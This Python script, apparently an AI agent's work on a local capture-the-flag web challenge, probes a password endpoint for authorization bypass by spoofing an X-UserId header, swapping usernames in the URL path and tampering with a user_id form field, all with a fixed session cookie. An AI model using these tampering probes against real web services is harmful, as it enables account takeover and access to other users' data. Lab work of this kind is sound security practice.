import requests
import re

BASE_URL = "http://127.0.0.1:33029"

original_session = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"
original_cookies = {'session': original_session}

# Step 1: Examine the /password/test page first (GET request)
print("[*] Examining GET /password/test page...")
pw_get = requests.get(f"{BASE_URL}/password/test", cookies=original_cookies, allow_redirects=False)
print(f"[+] Status: {pw_get.status_code}")
print(f"[+] Length: {len(pw_get.text)}")
print(f"[+] Content (first 1500 chars):")
print(pw_get.text[:1500])

# Look for hidden form fields
hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', pw_get.text)
if hidden_fields:
    print(f"\n[!] Hidden form fields: {hidden_fields}")

# Look for user-related data
user_matches = re.findall(r'(user_id|UserId|user-id)["\']?\s*[:=]\s*["\']?([^"\'>\s]+)', pw_get.text, re.I)
if user_matches:
    print(f"[!] User ID references in form: {user_matches}")

# Step 2: Test X-UserId header approach
print("\n" + "="*60)
print("[*] TESTING X-USERID HEADER")
print("="*60)

test_ids = [10030, 10031, 10032, 10033, 10000, 1]

for user_id in test_ids:
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-UserId': str(user_id)
    }
    
    resp = requests.post(
        f"{BASE_URL}/password/test",
        data="password=test",
        headers=headers,
        cookies=original_cookies,
        allow_redirects=False
    )
    
    location = resp.headers.get('Location', 'N/A')
    status = resp.status_code
    
    # Check for anomalies
    is_anomaly = (status == 200 or location != '/dashboard')
    marker = "[!] ANOMALY" if is_anomaly else "-"
    
    print(f"X-UserId={user_id}: Status={status}, Location={location} [{marker}]")
    
    if is_anomaly and status == 200:
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"    [!] FLAG: {flag_match.group(0)}")
        print(f"    Content: {resp.text[:500]}")

# Step 3: Test URL path manipulation /password/<username>
print("\n" + "="*60)
print("[*] TESTING URL PATH MANIPULATION")
print("="*60)

# The context mentioned username is in the URL path /password/test
# The username "test" appears to be the user identifier in the URL
# Let me try different usernames

test_urls = [
    "/password/admin",
    "/password/john",
    "/password/user1",
    "/password/user2",
    "/password/",
]

for url in test_urls:
    resp = requests.get(f"{BASE_URL}{url}", cookies=original_cookies, allow_redirects=False)
    print(f"GET {url}: Status={resp.status_code}, Location={resp.headers.get('Location', 'N/A')}")
    
    if resp.status_code == 200:
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"    [!] FLAG: {flag_match.group(0)}")
        # Check for differences
        if 'form' in resp.text.lower():
            form_match = re.search(r'<form.*?</form>', resp.text, re.DOTALL)
            if form_match:
                print(f"    Form found: {form_match.group(0)[:300]}")

# Step 4: Test POST to different password URLs with different user_ids
print("\n" + "="*60)
print("[*] COMBINED APPROACH: URL + POST user_id")
print("="*60)

url_variations = [
    "/password/test",
    "/password/admin",
]

user_ids = [10030, 10031, 10032, 10000, 1]

results = []
for url in url_variations:
    for user_id in user_ids:
        resp = requests.post(
            f"{BASE_URL}{url}",
            data=f"password=test&user_id={user_id}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies=original_cookies,
            allow_redirects=False
        )
        
        location = resp.headers.get('Location', 'N/A')
        is_anomaly = (resp.status_code == 200 or location != '/dashboard')
        
        results.append({
            'url': url,
            'user_id': user_id,
            'status': resp.status_code,
            'location': location,
            'is_anomaly': is_anomaly
        })
        
        if is_anomaly:
            print(f"[!] ANOMALY: POST {url} with user_id={user_id}: {resp.status_code} -> {location}")
            if resp.status_code == 200:
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"    [!] FLAG: {flag_match.group(0)}")

if not any(r['is_anomaly'] for r in results):
    print("[-] No anomalies in combined approach")
    print(f"[+] All {len(results)} combinations produced identical results")

